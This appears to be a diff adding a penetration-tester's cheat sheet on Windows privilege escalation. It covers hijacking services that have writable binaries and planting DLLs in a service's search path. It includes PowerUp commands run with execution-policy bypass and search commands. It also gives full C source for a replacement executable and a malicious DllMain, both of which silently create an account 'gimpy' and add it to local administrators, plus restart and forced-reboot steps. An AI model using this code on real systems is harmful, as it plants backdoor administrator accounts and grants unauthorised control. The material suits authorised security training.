@@ -1,0 +1,73 @@
+# Service Binary Hijacking
+# Automated
+powershell -ep bypass
+. .\PowerUp.ps1
+Get-ModifiableServiceFile
+Install-ServiceBinary -Name 'mysql'
+
+# Manually
+# Search
+Get-CimInstance -ClassName Win32_Service | Where-Object { $_.State -eq 'Running' -and $_.PathName -notlike 'C:\Windows\System32\*' } | Select-Object Name, State, PathName, StartMode
+
+# Look for write perm (W) or (F)
+icacls somepath.exe
+
+# script example -> x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
+\#include <stdlib.h>
+
+int main ()
+{
+  int i;
+  
+  i = system ("net user gimpy password123! /add");
+  i = system ("net localgroup administrators gimpy /add");
+  
+  return 0;
+}
+
+# replace and restart service if possible
+net stop <SERVICENAME>
+
+# or by rebooting if set to Auto and have the right (SeShutdownPrivilege)
+Get-CimInstance -ClassName win32_service | Select Name, StartMode | Where-Object {$_.Name -like 'mysql'}
+whoami /priv
+shutdown /r /t 0
+
+
+# Service DLL
+# Search order
+1. The directory from which the application loaded.
+2. The system directory.
+3. The 16-bit system directory.
+4. The Windows directory. 
+5. The current directory.
+6. The directories that are listed in the PATH environment variable.
+
+# Analyse after downloading the interesting process
+# Start procmon and restart service to see what get loaded
+
+# DLL Example -> x86_64-w64-mingw32-gcc myDLL.cpp --shared -o myDLL.dll
+\#include <stdlib.h>
+\#include <windows.h>
+
+BOOL APIENTRY DllMain(
+HANDLE hModule,// Handle to DLL module
+DWORD ul_reason_for_call,// Reason for calling function
+LPVOID lpReserved ) // Reserved
+{
+    switch ( ul_reason_for_call )
+    {
+        case DLL_PROCESS_ATTACH: // A process is loading the DLL.
+        int i;
+	    i = system ("net user gimpy password123! /add");
+	    i = system ("net localgroup administrators gimpy /add");
+        break;
+        case DLL_THREAD_ATTACH: // A process is creating a new thread.
+        break;
+        case DLL_THREAD_DETACH: // A thread exits normally.
+        break;
+        case DLL_PROCESS_DETACH: // A process unloads the DLL.
+        break;
+    }
+    return TRUE;
+}
